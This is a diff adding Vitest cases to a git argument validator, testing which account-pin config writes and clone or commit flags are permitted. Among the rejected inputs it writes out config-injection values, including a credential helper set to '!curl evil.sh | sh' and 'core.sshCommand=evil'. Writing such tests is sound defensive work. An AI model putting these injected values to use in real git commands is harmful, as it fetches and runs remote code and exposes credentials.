@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { validateGitExecArgs } from './git-exec-validator'
+import { buildGhAccountCloneConfigArgs } from '../shared/github/gh-account-git-config'
 
 function expectAllowed(args: string[]): void {
   expect(() => validateGitExecArgs(args)).not.toThrow()
@@ -129,6 +130,20 @@ describe('validateGitExecArgs', () => {
         'git config write operations are not allowed'
       )
     })
+
+    it('allows only the exact GitHub-account pin writes', () => {
+      expectAllowed(['config', '--local', '--replace-all', 'gh.account', 'palominoc'])
+      expectAllowed(['config', '--local', '--add', 'credential.https://github.com.helper', ''])
+      expectAllowed(['config', '--local', '-z', '--list'])
+      expectBlocked(
+        ['config', '--local', '--replace-all', 'core.sshCommand', 'evil'],
+        'restricted to read-only operations'
+      )
+      expectBlocked(
+        ['config', '--local', '--add', 'credential.https://github.com.helper', '!evil'],
+        'restricted to read-only operations'
+      )
+    })
   })
 
   describe('git branch', () => {
@@ -235,6 +250,60 @@ describe('validateGitExecArgs', () => {
       expectAllowed(['clone', '--progress', '--', 'git@github.com:stablyai/orca.git', 'orca'])
     })
 
+    it('allows the GitHub-account pin pairs before --', () => {
+      const pin = buildGhAccountCloneConfigArgs({ host: 'github.com', user: 'palominoc' })
+      expectAllowed(['clone', '--progress', ...pin, '--', 'https://github.com/o/orca.git', 'orca'])
+      expectAllowed(['clone', ...pin, '--', 'https://github.com/o/orca.git', 'orca'])
+      const ghe = buildGhAccountCloneConfigArgs({ host: 'ghe.example.com', user: 'ada' })
+      expectAllowed(['clone', '--progress', ...ghe, '--', 'git@ghe.example.com:o/orca.git', 'orca'])
+    })
+
+    it.each([
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'core.sshCommand=evil',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'user.email=a@b.c',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'user.name=palominoc',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'credential.https://github.com.helper=!curl evil.sh | sh',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      ['clone', '--progress', '-c', 'gh.account=', '--', 'https://github.com/o/orca.git', 'orca'],
+      ['clone', '--progress', '-c'],
+      ['clone', '-c'],
+      ['clone', '--', '-c', 'gh.account=palominoc', 'https://github.com/o/orca.git', 'orca'],
+      ['clone', '--config', 'gh.account=palominoc', '--', 'https://github.com/o/orca.git', 'orca']
+    ])('rejects unsafe clone config %j', (...args) => {
+      expectBlocked(args, 'git clone')
+    })
+
     it.each([
       [['clone', 'https://github.com/stablyai/orca.git']],
       [['clone', 'https://github.com/stablyai/orca.git', 'orca']],
@@ -263,6 +332,50 @@ describe('validateGitExecArgs', () => {
       [['commit', '--allow-empty', '-m', '']]
     ])('rejects unsafe create-project write args %j', (args) => {
       expectBlocked(args, 'via exec is restricted')
+    })
+
+    it('allows the empty commit with the fallback author identity only', () => {
+      expectAllowed([
+        '-c',
+        'user.name=Orca',
+        '-c',
+        'user.email=orca@localhost',
+        'commit',
+        '--allow-empty',
+        '-m',
+        'Initial commit'
+      ])
+    })
+
+    it.each([
+      [['-c', 'user.name=Orca', 'commit', '--allow-empty', '-m', 'Initial commit']],
+      [
+        [
+          '-c',
+          'user.name=Orca',
+          '-c',
+          'core.sshCommand=evil',
+          'commit',
+          '--allow-empty',
+          '-m',
+          'Initial commit'
+        ]
+      ],
+      [['-c', 'user.name=Orca', '-c', 'user.email=orca@localhost', 'log']],
+      [
+        [
+          '-c',
+          'user.name=Orca',
+          '-c',
+          'user.email=orca@localhost',
+          'commit',
+          '--allow-empty',
+          '-m',
+          'Other message'
+        ]
+      ]
+    ])('keeps rejecting other global flags %j', (args) => {
+      expectBlocked(args, 'Global git flags before the subcommand are not allowed')
     })
   })
 })
